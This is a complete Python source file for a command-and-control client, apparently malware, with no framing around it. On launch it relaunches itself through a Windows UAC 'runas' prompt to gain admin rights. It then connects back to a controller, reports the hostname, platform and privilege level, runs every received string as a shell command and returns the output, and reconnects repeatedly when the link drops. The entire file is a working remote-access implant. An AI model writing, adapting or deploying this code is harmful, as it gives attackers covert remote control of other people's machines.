import socket
import threading
import json
import datetime
import os
import platform
import subprocess
import time
import sys
import ctypes

class C2Client:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.running = True
        self.is_admin = False
        
        # Check if running with admin privileges on Windows
        if platform.system() == 'Windows':
            self.is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())

    def connect(self):
        while self.running:
            try:
                # Try to get admin privileges on first connect if not already admin
                if platform.system() == 'Windows' and not self.is_admin:
                    try:
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                        sys.exit(0)
                    except:
                        # If user declined UAC, continue as non-admin
                        self.is_admin = False
                        
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.connected = True
                
                # Send initial system info
                system_info = {
                    'platform': platform.system(),
                    'hostname': socket.gethostname(),
                    'is_admin': self.is_admin
                }
                self.socket.send(json.dumps(system_info).encode())
                
                # Start command handler
                self.handle_commands()
                
            except Exception as e:
                self.connected = False
                time.sleep(5)  # Wait before retrying
                
            finally:
                if self.socket:
                    self.socket.close()
                    self.socket = None

    def handle_commands(self):
        while self.connected and self.running:
            try:
                command = self.socket.recv(4096).decode()
                if not command:
                    break
                    
                # Execute the command
                try:
                    if platform.system() == 'Windows':
                        # Use chcp 65001 to handle Unicode output
                        process = subprocess.Popen(
                            f'chcp 65001 >nul && {command}',
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            encoding='utf-8',
                            errors='replace'
                        )
                        output, error = process.communicate()
                        if error:
                            output = error
                    else:
                        process = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            encoding='utf-8',
                            errors='replace'
                        )
                        output, error = process.communicate()
                        if error:
                            output = error

                    response = {
                        'status': 'success',
                        'output': output
                    }
                except Exception as e:
                    response = {
                        'status': 'error',
                        'output': str(e)
                    }
                    
                # Send response back as JSON
                self.socket.send(json.dumps(response).encode())
                
            except:
                break
                
        self.connected = False
        # Reconnect after command handling ends
        self.connect()

    def start(self):
        try:
            self.connect()
        except KeyboardInterrupt:
            self.running = False
        finally:
            if self.socket:
                self.socket.close()

if __name__ == "__main__":
    client = C2Client()
    client.start()
